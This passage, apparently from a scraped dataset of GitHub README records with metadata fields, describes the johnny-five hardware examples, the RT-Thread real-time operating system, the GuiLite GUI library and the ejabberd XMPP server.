you\u2019ll find throughout the site. a huge part of doing any johnny-five project is handling the actual hardware, and we\u2019ve included these as part of the documentation because we realised that instructions on how to write code to control a servo are insufficient without instructions on how to connect a servo!\nto interactively navigate the examples, visit the johnny-five examples page on the official website. if you want to link directly to the examples in this repo, you can use one of the following links.\nthere are presently 362 example programs with code and diagrams!\nboard\nboard - basic initialization\nboard - cleanup in 'exit' event\nboard - multiple in one program\nboard - specify sampling interval\nboard - specify port\ncustom data properties\npin\nrepl\nled\nled\nled - blink\nled - demo sequence\nled - fade\nled - fade callback\nled - fade with animation\nled - pca9685\nled - pulse\nled - pulse with animation\nled - slider\nled - tessel servo module\nleds - an array of leds\nleds - controlling an array of leds\nled: rgb\nled - rgb (common anode)\nled - rgb (common anode) pca9685\nled - rgb intensity\nled - rainbow\nled - rainbow blinkm\nled: digits & matrix\nled - digital clock\nled - digital clock, dual displays\nled - digital clock, ht16k33\nled - draw matrix characters demo\nled - enumerate matrix characters & symbols\nled - matrix\nled - matrix demo\nled - matrix ht16k33\nled - matrix ht16k33 16x8\nservo\nservo\nservo - continuous\nservo - drive\nservo - multi-turn\nservo - pca9685\nservo - prompt\nservo - slider control\nservo - tessel servo module\nservos - an array of servos\ngps\ngps - adafruit ultimate gps breakout\ngps - default gps\ngps - hardware serial\ngps - sparkfun gp-20u7\nservo animation\nservo - animation\nservo - leg animation\ncolor\ncolor - evshield ev3 (code)\ncolor - evshield ev3 (raw)\ncolor - evshield nxt (code)\ncolor - isl29125\nmotor\nmotor\nmotor - 3 pin\nmotor - adafruit drv8871 dc motor driver breakout\nmotor - brake\nmotor - current\nmotor - directional\nmotor - evshield ev3\nmotor - evshield nxt\nmotor - enable pin\nmotor - grove_i2c_motor_driver\nmotor - h-bridge\nmotor - ludus\nmotor - pca9685\nmotor - pololu vnh5019 dual motor driver breakout\nmotor - sparkfun dual h-bridge edison block\nmotor - sparkfun tb6612fng\nmotor - l298 breakout\nmotors - dual h-bridge\nstepper motor\nstepper - driver\nstepper - four wire\nstepper - sweep\nesc & brushless motor\nesc - bidirectional\nesc - keypress controlled escs\nesc - pca9685\nbutton / switch\nbutton\nbutton - bumper\nbutton - evshield ev3\nbutton - evshield nxt\nbutton - options\nbutton - pullup\nbuttons - collection w/ at42qt1070\nswitch\nswitch - magnetic door\nswitch - tilt sw-200d\ntoggle switch\nkeypad\nkeypad - 3x4 i2c nano backpack\nkeypad - 4x4 i2c nano backpack\nkeypad - vkey\nkeypad - waveshare ad\ntouchpad - grove qtouch\ntouchpad - mpr121\ntouchpad - mpr121, sensitivity\ntouchpad - mpr121qr2_shield\ntouchpad - mpr121_keypad\ntouchpad - mpr121_shield\nrelay\nrelay\nrelay - collection\nrelay on analog pin\nshift register\nshift register\nshift register - common anode seven segment controller\nshift register - common anode seven segments, chained\nshift register - seven segment controller\nshift register - seven segments, chained\ninfrared reflectance\nir motion\nir proximity\nir reflectance\nir reflectance array\nproximity\nproximity\nproximity - evshield ev3 (ir)\nproximity - evshield ev3 (ir)\nproximity - evshield ev3 (ultrasonic)\nproximity - evshield ev3 (ultrasonic)\nproximity - gp2y0a710k0f\nproximity - hc-sr04\nproximity - hc-sr04 (analog)\nproximity - hc-sr04 i2c backpack\nproximity - lidar-lite\nproximity - mb1000\nproximity - mb1003\nproximity - mb1010\nproximity - mb1230\nproximity - srf10\nmotion\nmotion\nmotion - gp2y0a60szlf\nmotion - gp2y0d805z0f\nmotion - gp2y0d810z0f\nmotion - gp2y0d810z0f\njoystick\njoystick\njoystick - esplora\njoystick - pan + tilt control\njoystick - sparkfun shield\nlcd\ngrove - rgb lcd color previewer\nlcd\nlcd - enumerate characters\nlcd - i2c\nlcd - i2c pcf8574\nlcd - i2c runner\nlcd - runner 16x2\nlcd - runner 20x4\nlcd - tessel 2 16x2\ntessel 2 + grove - rgb lcd color previewer\ntessel 2 + grove - rgb lcd display\ncompass/magnetometer\ncompass - find north\ncompass - hmc5883l\ncompass - hmc6352\ncompass - logger\ncompass - mag3110\ncompass - mag3110 on tessel 2\ncompass / magnetometer\npiezo\npiezo\nimu/multi\nimu - bno055\nimu - bno055 (orientation)\nimu - lsm303c\nimu - mpu6050\nmulti - bme280\nmulti - bmp085\nmulti - bmp180\nmulti - dht11_i2c_nano_backpack\nmulti - dht21_i2c_nano_backpack\nmulti - dht22_i2c_nano_backpack\nmulti - hih6130\nmulti - htu21d\nmulti - mpl115a2\nmulti - mpl3115a2\nmulti - ms5611\nmulti - sht31d\nmulti - si7020\nmulti - si7021\nmulti - th02\nsensors\naccelerometer\naccelerometer - adxl335\naccelerometer - adxl345\naccelerometer - lis3dh\naccelerometer - mma7361\naccelerometer - mma8452\naccelerometer - mpu6050\naccelerometer - pan + tilt\naltimeter - bmp085\naltimeter - bmp180\naltimeter - mpl3115a2\naltimeter - ms5611\nbarometer - bmp085\nbarometer - bmp180\nbarometer - mpl115a2\nbarometer - mpl3115a2\nbarometer - ms5611\ngyro\ngyro - analog lpr5150al\ngyro - i2c mpu6050\nhygrometer - dht11_i2c_nano_backpack\nhygrometer - dht21_i2c_nano_backpack\nhygrometer - dht22_i2c_nano_backpack\nhygrometer - hih6130\nhygrometer - htu21d\nhygrometer - sht31d\nhygrometer - si7021\nhygrometer - th02\nsensor\nsensor - digital microwave\nsensor - flex sensor\nsensor - force sensitive resistor\nsensor - microphone\nsensor - photoresistor\nsensor - potentiometer\nsensor - slide potentiometer\nthermometer - bmp085\nthermometer - bmp180\nthermometer - dht11_i2c_nano_backpack\nthermometer - dht21_i2c_nano_backpack\nthermometer - dht22_i2c_nano_backpack\nthermometer - ds18b20\nthermometer - dual ds18b20\nthermometer - hih6130\nthermometer - htu21d\nthermometer - lm335\nthermometer - lm35\nthermometer - max31850\nthermometer - mcp9808\nthermometer - mpl115a2\nthermometer - mpl3115a2\nthermometer - mpu6050\nthermometer - ms5611\nthermometer - sht31d\nthermometer - si7020\nthermometer - si7021\nthermometer - th02\nthermometer - tmp102\nthermometer - tmp36\nexpander\nexpander - 74hc595\nexpander - cd74hc4067, 16 channel analog input breakout\nexpander - lis3dh\nexpander - mcp23008\nexpander - mcp23017\nexpander - muxshield2, analog sensors\nexpander - muxshield2, digital input and output\nexpander - pca9685\nexpander - pcf8574\nexpander - pcf8575\nexpander - pcf8591\nphoton weather shield\nphoton weather shield: moisture\nlego evshield\nbutton - evshield ev3\nbutton - evshield nxt\ncolor - evshield ev3 (code)\ncolor - evshield ev3 (raw)\ncolor - evshield nxt (code)\nlight - bh1750\nlight - evshield ev3 (ambient)\nlight - evshield ev3 (reflected)\nlight - evshield nxt (ambient)\nlight - evshield nxt (reflected)\nlight - tsl2561\nmotor - evshield ev3\nmotor - evshield nxt\nproximity - evshield ev3 (ir)\nproximity - evshield ev3 (ultrasonic)\nintel edison + grove iot kit\nintel edison + grove - accelerometer (adxl345)\nintel edison + grove - accelerometer (mma7660)\nintel edison + grove - air quality sensor\nintel edison + grove - barometer (bmp180)\nintel edison + grove - button\nintel edison + grove - compass (hmc588l)\nintel edison + grove - flame sensor\nintel edison + grove - gas (mq2)\nintel edison + grove - humidity & temperature (th02)\nintel edison + grove - i2c motor driver\nintel edison + grove - joystick\nintel edison + grove - led\nintel edison + grove - light sensor (tsl2561)\nintel edison + grove - moisture sensor\nintel edison + grove - q touch\nintel edison + grove - rgb lcd\nintel edison + grove - rgb lcd color previewer\nintel edison + grove - rgb lcd temperature display\nintel edison + grove - relay\nintel edison + grove - rotary potentiometer\nintel edison + grove - servo\nintel edison + grove - touch\ngrove iot kit (seeed studio)\ngrove - button\ngrove - joystick\ngrove - led\ngrove - motor (i2c driver)\ngrove - rgb lcd\ngrove - rgb lcd temperature display\ngrove - rotary potentiometer\ngrove - servo\ngrove - touch\nmicro magician v2\nmicro magician v2 - accelerometer\nmicro magician v2 - motor\nmicro magician v2 - servo\ntinkerkit\ntinkerkit - accelerometer\ntinkerkit - blink\ntinkerkit - button\ntinkerkit - combo\ntinkerkit - continuous servo\ntinkerkit - gyro\ntinkerkit - joystick\ntinkerkit - linear potentiometer\ntinkerkit - rotary potentiometer\ntinkerkit - temperature\ntinkerkit - tilt\ntinkerkit - touch\nwii\nwii classic controller\nwii nunchuck\ncomplete bots / projects\nbug\nkinect robotic arm controller\nlaser trip wire\nline follower\nlynxmotion biped brat\nmotobot\nnavigator\nnodebot\nphoenix hexapod\nradar\nrobotic claw\nwhisker\ncomponent plugin template\nexample plugin\nio plugins\nled blink on electric imp\nled blink on intel edison arduino board\nled blink on intel edison mini board\nled blink on intel galileo gen 2\nled blink on raspberry pi\nled blink on spark core\nled blink on pcduino3\nmany fragments. some large, some small.\nwireless nodebot\nkinect controlled robot arm\nbiped nodebot\nlcd running man\nslider controlled panning servo\njoystick controlled laser (pan/tilt) 1\njoystick controlled laser (pan/tilt) 2\njoystick controlled claw\nrobot claw\njoystick, motor & led\nbuild you own drone\nmake: javascript robotics\ncontributing\nall contributions must adhere to the idiomatic.js style guide, by maintaining the existing coding style. add unit tests for any new or changed functionality. lint and test your code using grunt.\nlicense\ncopyright (c) 2012, 2013, 2014 rick waldron waldron.rick@gmail.com licensed under the mit license. copyright (c) 2014, 2015 the johnny-five contributors licensed under the mit license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000007, "year": null}, {"Unnamed: 0": 21, "autor": 21, "date": null, "content": "English | \u4e2d\u6587 |\nRT-Thread\nRT-Thread was born in 2006, it is an open source, neutral, and community-based real-time operating system (RTOS).\nRT-Thread is mainly written in C language, easy to understand and easy to port(can be quickly port to a wide range of mainstream MCUs and module chips). It applies object-oriented programming methods to real-time system design, making the code elegant, structured, modular, and very tailorable.\nRT-Thread has Standard version and Nano version. For resource-constrained microcontroller (MCU) systems, the NANO kernel version that requires only 3KB Flash and 1.2KB RAM memory resources can be tailored with easy-to-use tools; And for resource-rich IoT devices, RT-Thread can use the on-line software package management tool, together with system configuration tools, to achieve intuitive and rapid modular cutting, seamlessly import rich software packages, thus achieving complex functions like Android's graphical interface and touch sliding effects, smart voice interaction effects, and so on.\nRT-Thread Architecture\nRT-Thread has not only a real-time kernel, but also rich components. Its architecture is as follows:\nIt includes:\nKernel layer: RT-Thread kernel, the core part of RT-Thread, includes the implementation of objects in the kernel system, such as multi-threading and its scheduling, semaphore, mailbox, message queue, memory management, timer, etc.; libcpu/BSP (Chip Migration Related Files/Board Support Package) is closely related to hardware and consists of peripheral drivers and CPU porting.\nComponents and Service Layer: Components are based on upper-level software on top of the RT-Thread kernel, such as virtual file systems, FinSH command-line interfaces, network frameworks, device frameworks, and more. Its modular design allows for high internal cohesion inside the components and low coupling between components.\nRT-Thread software package: A general-purpose software component running on the RT-Thread IoT operating system platform for different application areas, consisting of description information, source code or library files. RT-Thread provides an open package platform with officially available or developer-supplied packages that provide developers with a choice of reusable packages that are an important part of the RT-Thread ecosystem. The package ecosystem is critical to the choice of an operating system because these packages are highly reusable and modular, making it easy for application developers to build the system they want in the shortest amount of time. RT-Thread supports more than 370 software packages.\nRT-Thread Features\nDesigned for resource-constrained devices, the minimum kernel requires only 1.2KB of RAM and 3 KB of Flash.\nHas rich components and a prosperous and fast growing package ecosystem.\nElegant code style, easy to use, read and master.\nHigh Scalability. RT-Thread has high-quality scalable software architecture, loose coupling, modularity, is easy to tailor and expand.\nSupports high-performance applications.\nSupports cross-platform and a wide range of chips.\nCode Catalogue\nRT-Thread source code catalog is shown as follow:\nName Description\nBSP Board Support Package based on the porting of various development boards\ncomponents Components, such as finsh shell, file system, protocol stack etc.\ndocumentation Related documents, like coding style, doxygen etc.\nexamples Related sample code\ninclude Head files of RT-Thread kernel\nlibcpu CPU porting code such as ARM/MIPS/RISC-V etc.\nsrc The source files for the RT-Thread kernel.\ntools The script files for the RT-Thread command build tool.\nRT-Thread has now been ported for nearly 200 development boards, most BSPs support MDK, IAR development environment and GCC compiler, and have provided default MDK and IAR project, which allows users to add their own application code directly based on the project. Each BSP has a similar directory structure, and most BSPs provide a README.md file, which is a markdown-format file that contains the basic introduction of BSP, and introduces how to simply start using BSP.\nResources\nSupported Architectures\nRT-Thread supports many architectures, and has covered the major architectures in current applications. Architecture and chip manufacturer involved:\nARM Cortex-M0/M0+\uff1amanufacturers like ST\nARM Cortex-M3\uff1amanufacturers like ST\u3001Winner Micro\u3001MindMotion, ect.\nARM Cortex-M4\uff1amanufacturers like ST\u3001Nuvton\u3001NXP\u3001GigaDevice\u3001Realtek\u3001Ambiq Micro, ect.\nARM Cortex-M7\uff1amanufacturers like ST\u3001NXP\nARM Cortex-M23\uff1amanufacturers like GigaDevice\nARM Cortex-M33\uff1amanufacturers like ST\nARM Cortex-R4\nARM Cortex-A8/A9\uff1amanufacturers like NXP\nARM7\uff1amanufacturers like Samsung\nARM9\uff1amanufacturers like Allwinner\u3001Xilinx \u3001GOKE\nARM11\uff1amanufacturers like Fullhan\nMIPS32\uff1amanufacturers like loongson\u3001Ingenic\nRISC-V\uff1amanufacturers like Hifive\u3001Kendryte\u3001Nuclei\nARC\uff1amanufacturers like SYNOPSYS\nDSP\uff1amanufacturers like TI\nC-Sky\nx86\nSupported IDE and Compiler\nThe main IDE/compilers supported by RT-Thread are:\nRT-Thread Studio IDE\nMDK KEIL\nIAR\nGCC\nRT-Thread Studio IDE\nUser Manual | Tutorial Videos\nRT-Thread Studio IDE (a.k.a. RT-Studio) is a one-stop intergrated development environment built by RT-Thread team. It has a easy-to-use graphical configuration system and a wealth of software packages and components resources. RT-Studio has the features of project creation, configuration and management,as well as code editing, SDK management, build configuration, debugging configuration, program download and debug. We're looking to make the use of RT-Studio as intuitive as possible, reducing the duplication of work and improving the development efficiency.\nEnv Tool\nUser Manual | Tutorial Videos\nIn the early stage, RT-Thread team also created an auxiliary tool called Env. It is an auxiliary tool with a TUI (Text-based user interface). Developers can use Env tool to configure and generate the GCC, Keil MDK, and IAR projects.\nGetting Started\nRT-Thread Programming Guide | RT-Thread Studio IDE | Kernel Sample | RT-Thread Beginners Guide\nBased on STM32F103 BluePill | Raspberry Pi Pico\nSimulator\nRT-Thread BSP can be compiled directly and downloaded to the corresponding development board for use. In addition, RT-Thread also provides qemu-vexpress-a9 BSP, which can be used without hardware platform. See the getting started guide below for details.\nGetting Started of QEMU with Env(Windows)\nGetting Started of QEMU with Env(Ubuntu)\nLicense\nRT-Thread is an open source software and has been licensed under Apache License Version 2.0 since v3.1.1. License information and copyright information can generally be seen at the beginning of the code:\n/* Copyright (c) 2006-2018, RT-Thread Development Team\n*\n* SPDX-License-Identifier: Apache-2.0\n* ...\n*/\nCommunity\nRT-Thread is very grateful for the support from all community developers, and if you have any ideas, suggestions or questions in the process of using RT-Thread, RT-Thread can be reached by the following means, and we are also updating RT-Thread in real time on these channels. At the same time, any questions can be asked in the issue section of RT-Thread repository or RT-Thread forum, and community members will answer them.\nWebsite | Github | Twitter | LinkedIn | Youtube | Facebook | Medium\nContribution\nIf you are interested in RT-Thread and want to join in the development of RT-Thread and become a code contributor,please refer to the Code Contribution Guide.", "link": "https://github.com/RT-Thread/rt-thread", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "english | \u4e2d\u6587 |\nrt-thread\nrt-thread was born in 2006, it is an open source, neutral, and community-based real-time operating system (rtos).\nrt-thread is mainly written in c language, easy to understand and easy to port(can be quickly port to a wide range of mainstream mcus and module chips). it applies object-oriented programming methods to real-time system design, making the code elegant, structured, modular, and very tailorable.\nrt-thread has standard version and nano version. for resource-constrained microcontroller (mcu) systems, the nano kernel version that requires only 3kb flash and 1.2kb ram memory resources can be tailored with easy-to-use tools; and for resource-rich iot devices, rt-thread can use the on-line software package management -----> tool !!! , together with system configuration tools, to achieve intuitive and rapid modular cutting, seamlessly import rich software packages, thus achieving complex functions like android's graphical interface and touch sliding effects, smart voice interaction effects, and so on.\nrt-thread architecture\nrt-thread has not only a real-time kernel, but also rich components. its architecture is as follows:\nit includes:\nkernel layer: rt-thread kernel, the core part of rt-thread, includes the implementation of objects in the kernel system, such as multi-threading and its scheduling, semaphore, mailbox, message queue, memory management, timer, etc.; libcpu/bsp (chip migration related files/board support package) is closely related to hardware and consists of peripheral drivers and cpu porting.\ncomponents and service layer: components are based on upper-level software on top of the rt-thread kernel, such as virtual file systems, finsh command-line interfaces, network frameworks, device frameworks, and more. its modular design allows for high internal cohesion inside the components and low coupling between components.\nrt-thread software package: a general-purpose software component running on the rt-thread iot operating system platform for different application areas, consisting of description information, source code or library files. rt-thread provides an open package platform with officially available or developer-supplied packages that provide developers with a choice of reusable packages that are an important part of the rt-thread ecosystem. the package ecosystem is critical to the choice of an operating system because these packages are highly reusable and modular, making it easy for application developers to build the system they want in the shortest amount of time. rt-thread supports more than 370 software packages.\nrt-thread features\ndesigned for resource-constrained devices, the minimum kernel requires only 1.2kb of ram and 3 kb of flash.\nhas rich components and a prosperous and fast growing package ecosystem.\nelegant code style, easy to use, read and master.\nhigh scalability. rt-thread has high-quality scalable software architecture, loose coupling, modularity, is easy to tailor and expand.\nsupports high-performance applications.\nsupports cross-platform and a wide range of chips.\ncode catalogue\nrt-thread source code catalog is shown as follow:\nname description\nbsp board support package based on the porting of various development boards\ncomponents components, such as finsh shell, file system, protocol stack etc.\ndocumentation related documents, like coding style, doxygen etc.\nexamples related sample code\ninclude head files of rt-thread kernel\nlibcpu cpu porting code such as arm/mips/risc-v etc.\nsrc the source files for the rt-thread kernel.\ntools the script files for the rt-thread command build tool.\nrt-thread has now been ported for nearly 200 development boards, most bsps support mdk, iar development environment and gcc compiler, and have provided default mdk and iar project, which allows users to add their own application code directly based on the project. each bsp has a similar directory structure, and most bsps provide a readme.md file, which is a markdown-format file that contains the basic introduction of bsp, and introduces how to simply start using bsp.\nresources\nsupported architectures\nrt-thread supports many architectures, and has covered the major architectures in current applications. architecture and chip manufacturer involved:\narm cortex-m0/m0+\uff1amanufacturers like st\narm cortex-m3\uff1amanufacturers like st\u3001winner micro\u3001mindmotion, ect.\narm cortex-m4\uff1amanufacturers like st\u3001nuvton\u3001nxp\u3001gigadevice\u3001realtek\u3001ambiq micro, ect.\narm cortex-m7\uff1amanufacturers like st\u3001nxp\narm cortex-m23\uff1amanufacturers like gigadevice\narm cortex-m33\uff1amanufacturers like st\narm cortex-r4\narm cortex-a8/a9\uff1amanufacturers like nxp\narm7\uff1amanufacturers like samsung\narm9\uff1amanufacturers like allwinner\u3001xilinx \u3001goke\narm11\uff1amanufacturers like fullhan\nmips32\uff1amanufacturers like loongson\u3001ingenic\nrisc-v\uff1amanufacturers like hifive\u3001kendryte\u3001nuclei\narc\uff1amanufacturers like synopsys\ndsp\uff1amanufacturers like ti\nc-sky\nx86\nsupported ide and compiler\nthe main ide/compilers supported by rt-thread are:\nrt-thread studio ide\nmdk keil\niar\ngcc\nrt-thread studio ide\nuser manual | tutorial videos\nrt-thread studio ide (a.k.a. rt-studio) is a one-stop intergrated development environment built by rt-thread team. it has a easy-to-use graphical configuration system and a wealth of software packages and components resources. rt-studio has the features of project creation, configuration and management,as well as code editing, sdk management, build configuration, debugging configuration, program download and debug. we're looking to make the use of rt-studio as intuitive as possible, reducing the duplication of work and improving the development efficiency.\nenv tool\nuser manual | tutorial videos\nin the early stage, rt-thread team also created an auxiliary tool called env. it is an auxiliary tool with a tui (text-based user interface). developers can use env tool to configure and generate the gcc, keil mdk, and iar projects.\ngetting started\nrt-thread programming guide | rt-thread studio ide | kernel sample | rt-thread beginners guide\nbased on stm32f103 bluepill | raspberry pi pico\nsimulator\nrt-thread bsp can be compiled directly and downloaded to the corresponding development board for use. in addition, rt-thread also provides qemu-vexpress-a9 bsp, which can be used without hardware platform. see the getting started guide below for details.\ngetting started of qemu with env(windows)\ngetting started of qemu with env(ubuntu)\nlicense\nrt-thread is an open source software and has been licensed under apache license version 2.0 since v3.1.1. license information and copyright information can generally be seen at the beginning of the code:\n/* copyright (c) 2006-2018, rt-thread development team\n*\n* spdx-license-identifier: apache-2.0\n* ...\n*/\ncommunity\nrt-thread is very grateful for the support from all community developers, and if you have any ideas, suggestions or questions in the process of using rt-thread, rt-thread can be reached by the following means, and we are also updating rt-thread in real time on these channels. at the same time, any questions can be asked in the issue section of rt-thread repository or rt-thread forum, and community members will answer them.\nwebsite | github | twitter | linkedin | youtube | facebook | medium\ncontribution\nif you are interested in rt-thread and want to join in the development of rt-thread and become a code contributor,please refer to the code contribution guide.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000021, "year": null}, {"Unnamed: 0": 24, "autor": 24, "date": null, "content": "Welcome to GUI-lite\nThe smallest header-only GUI library (4 KLOC) for all platforms.\n\u4e2d\u6587\nLightweight\n\u2702\ufe0fSmall: 4,000+ lines of C++ code, zero dependency, header-only(GuiLite.h)\n\u26a1Fast: High Rendering performance, even work on MCU\n\ud83d\udc6b\ud83c\udffbCompatible: Work smoothly with 3rd party frameworks(Qt/MFC/Winform/Cocoa/Web)\n\u2699\ufe0f\ufe0fHardware Minimum Requirements:\nProcessor Disk/ROM space Memory\n24 MHZ 29 KB 9 KB\nCross platform\nSupported OSes: iOS/macOS/WatchOS, Android, Linux, Windows, RTOS... or MCU without OS\nSupported languages: C/C++, Swift, Java, Javascript, C#, Golang...\nSupported 3rd party libraries: Qt, MFC, Winforms, CoCoa...\nHero features\n\u2601\ufe0fCloud + IoT Solution: master your IoT business all over the world\n\ud83d\udd23Multi-language, supports UTF-8;\ud83d\udcc0Playback Video\n\ud83d\udd28Toolkit for building font/image resources\n\ud83d\udcd0Layout GUI WYSIWYG\n\ud83d\udccaCode Telemetry and Analysis in real time(remove .sh/.bat files if dislike to share)\n\ud83d\udce6Supports 3D and Web\n\ud83d\udc0bRun in docker with a single command: sudo docker run -it --privileged -v /dev:/dev-share idea4good/gui-lite:latest bash /run.sh\nEasy to learn and support\nEven a C beginner could master GUI-lite quickly. The source code only uses basic C++ features (class, virtual function). We chose C++ as it could make the code size significantly smaller and easier to read.\n\ud83d\udcdaDocumentation\nHow to use GUI-lite?\nDesign specification\nHow to Layout widgets?\nHow to build unicode font/bitmap resource?\nHow to switch theme?\nHow to dispatch messages?\nUML chart of GUI-lite core\n\ud83d\udcc8Learning steps\nBuild GUI-lite library\nBuild/Debug HelloXXX demos\nRead/Modify HelloXXX/UIcode/UIcode.cpp code\nRead/Modify widgets code\nRead/Modify core code\nBuild your GUI framework\n\ud83d\udcdeReach out us if you have any questions you are welcomed to our developer family.\n\ud83c\udc04\ufe0fMirror repository in China\nDemo wall\nZero dependency, 100% build pass & runnable\nClick the demo you like, and run it on your hardware\nMost of the demos have about 100 lines of UI code, code repository is here.\nMCU platform\n3D on STM32\nWave on STM32\nParticle on STM32\nStar on STM32\n3D wave on STM32\nKeyboard on STM32\nMario on STM32\n3D circle on STM32\n3D donut on STM32\nTimer\nMolecule move\nPendulum effect\nIoT feature\nMonitor IoT device on cloud\nCode Telemetry & Analysis in real time\nTrack IoT device over the world\nMulti-language, Design tool and video\nLattice Font\nFreetype Font\nLayout GUI\nRender JPG file quickly\nPlay video with FFmpeg\nWidgets & Controller\nEmulate Windows UI\nScroll widget\nHow to use widgets\n3D Nets on Windows/Linux\nTransparent dialog\nSwipe view\nCross platform\nHostMonitor on Windows\nHostMonitor on Mac\nHostMonitor on Android\nHostMonitor on Windows Mixed Reality\nHostMonitor on Linux\n3D on Web\n3D on Web\nHostMonitor on iPhone\nHow display work\nApple platform\n3D on Apple Watch\nWave on Apple Watch\nParticle on iPhone\n\ud83d\udcdeCommunity Channel\nThanks for the help from the community, you all make GUI-lite better! And welcome to any new friend to join us.\n@Twitter\nQQ group code:\n\u958b\u767c\u7fa4\ud83d\udd11\uff1a938682319", "link": "https://github.com/idea4good/GuiLite", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "welcome to gui-lite\nthe smallest header-only gui library (4 kloc) for all platforms.\n\u4e2d\u6587\nlightweight\n\u2702\ufe0fsmall: 4,000+ lines of c++ code, zero dependency, header-only(guilite.h)\n\u26a1fast: high rendering performance, even work on mcu\n\ud83d\udc6b\ud83c\udffbcompatible: work smoothly with 3rd party frameworks(qt/mfc/winform/cocoa/web)\n\u2699\ufe0f\ufe0fhardware minimum requirements:\nprocessor disk/rom space memory\n24 mhz 29 kb 9 kb\ncross platform\nsupported oses: ios/macos/watchos, android, linux, windows, rtos... or mcu without os\nsupported languages: c/c++, swift, java, javascript, c#, golang...\nsupported 3rd party libraries: qt, mfc, winforms, cocoa...\nhero features\n\u2601\ufe0fcloud + iot solution: master your iot business all over the world\n\ud83d\udd23multi-language, supports utf-8;\ud83d\udcc0playback video\n\ud83d\udd28toolkit for building font/image resources\n\ud83d\udcd0layout gui wysiwyg\n\ud83d\udccacode telemetry and analysis in real time(remove .sh/.bat files if dislike to share)\n\ud83d\udce6supports 3d and web\n\ud83d\udc0brun in docker with a single command: sudo docker run -it --privileged -v /dev:/dev-share idea4good/gui-lite:latest bash /run.sh\neasy to learn and support\neven a c beginner could master gui-lite quickly. the source code only uses basic c++ features (class, virtual function). we chose c++ as it could make the code size significantly smaller and easier to read.\n\ud83d\udcdadocumentation\nhow to use gui-lite?\ndesign specification\nhow to layout widgets?\nhow to build unicode font/bitmap resource?\nhow to switch theme?\nhow to dispatch messages?\numl chart of gui-lite core\n\ud83d\udcc8learning steps\nbuild gui-lite library\nbuild/debug helloxxx demos\nread/modify helloxxx/uicode/uicode.cpp code\nread/modify widgets code\nread/modify core code\nbuild your gui framework\n\ud83d\udcdereach out us if you have any questions you are welcomed to our developer family.\n\ud83c\udc04\ufe0fmirror repository in china\ndemo wall\nzero dependency, 100% build pass & runnable\nclick the demo you like, and run it on your hardware\nmost of the demos have about 100 lines of ui code, code repository is here.\nmcu platform\n3d on stm32\nwave on stm32\nparticle on stm32\nstar on stm32\n3d wave on stm32\nkeyboard on stm32\nmario on stm32\n3d circle on stm32\n3d donut on stm32\ntimer\nmolecule move\npendulum effect\niot feature\nmonitor iot device on cloud\ncode telemetry & analysis in real time\ntrack iot device over the world\nmulti-language, design -----> tool !!!  and video\nlattice font\nfreetype font\nlayout gui\nrender jpg file quickly\nplay video with ffmpeg\nwidgets & controller\nemulate windows ui\nscroll widget\nhow to use widgets\n3d nets on windows/linux\ntransparent dialog\nswipe view\ncross platform\nhostmonitor on windows\nhostmonitor on mac\nhostmonitor on android\nhostmonitor on windows mixed reality\nhostmonitor on linux\n3d on web\n3d on web\nhostmonitor on iphone\nhow display work\napple platform\n3d on apple watch\nwave on apple watch\nparticle on iphone\n\ud83d\udcdecommunity channel\nthanks for the help from the community, you all make gui-lite better! and welcome to any new friend to join us.\n@twitter\nqq group code:\n\u958b\u767c\u7fa4\ud83d\udd11\uff1a938682319", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000024, "year": null}, {"Unnamed: 0": 28, "autor": 28, "date": null, "content": "ejabberd Community Edition\nejabberd is a distributed, fault-tolerant technology that allows the creation of large-scale instant messaging applications. The server can reliably support thousands of simultaneous users on a single node and has been designed to provide exceptional standards of fault tolerance. As an open source technology, based on industry-standards, ejabberd can be used to build bespoke solutions very cost effectively.\nKey Features\nCross-platform\nejabberd runs under Microsoft Windows and Unix-derived systems such as Linux, FreeBSD and NetBSD.\nDistributed\nYou can run ejabberd on a cluster of machines and all of them will serve the same XMPP domain(s). When you need more capacity you can simply add a new cheap node to your cluster. Accordingly, you do not need to buy an expensive high-end machine to support tens of thousands concurrent users.\nFault-tolerant\nYou can deploy an ejabberd cluster so that all the information required for a properly working service will be replicated permanently on all nodes. This means that if one of the nodes crashes, the others will continue working without disruption. In addition, nodes also can be added or replaced \u2018on the fly\u2019.\nAdministrator-friendly\nejabberd is built on top of the Open Source Erlang. As a result you do not need to install an external database, an external web server, amongst others because everything is already included, and ready to run out of the box. Other administrator benefits include:\nComprehensive documentation.\nStraightforward installers for Linux.\nDocker packaging to help with deploy / development on Linux, Windows or MacOS.\nDeb and RPM packaging to support most Linux distributions.\nWeb administration.\nShared roster groups.\nCommand line administration tool.\nCan integrate with existing authentication mechanisms.\nCapability to send announce messages.\nInternationalized\nejabberd leads in internationalization. Hence it is very well suited in a globalized world. Related features are:\nTranslated to 25 languages.\nSupport for IDNA.\nOpen Standards\nejabberd is the first Open Source XMPP server claiming to fully comply to the XMPP standard.\nFully XMPP-compliant.\nXML-based protocol.\nMany protocols supported.\nAdditional Features\nMoreover, ejabberd comes with a wide range of other state-of-the-art features:\nModularity\nLoad only the modules you want.\nExtend ejabberd with your own custom modules.\nSecurity\nSASL and STARTTLS for c2s and s2s connections.\nSTARTTLS and Dialback s2s connections.\nWeb Admin accessible via HTTPS secure access.\nDatabases\nInternal database for fast deployment (Mnesia).\nNative MySQL support.\nNative PostgreSQL support.\nODBC data storage support.\nMicrosoft SQL Server support.\nAuthentication\nInternal authentication.\nPAM, LDAP and ODBC.\nExternal authentication script.\nOthers\nSupport for virtual hosting.\nCompressing XML streams with Stream Compression (XEP-0138).\nStatistics via Statistics Gathering (XEP-0039).\nIPv6 support both for c2s and s2s connections.\nMulti-User Chat module with support for clustering and HTML logging.\nUsers Directory based on users vCards.\nPublish-Subscribe component with support for Personal Eventing.\nSupport for web clients: HTTP Polling and HTTP Binding (BOSH).\nComponent support: interface with networks such as AIM, ICQ and MSN.\nQuickstart guide\n0. Requirements\nTo compile ejabberd you need:\nGNU Make.\nGCC.\nLibexpat \u2265 1.95.\nLibyaml \u2265 0.1.4.\nErlang/OTP \u2265 19.3.\nOpenSSL \u2265 1.0.0.\nZlib \u2265 1.2.3, for Stream Compression support (XEP-0138). 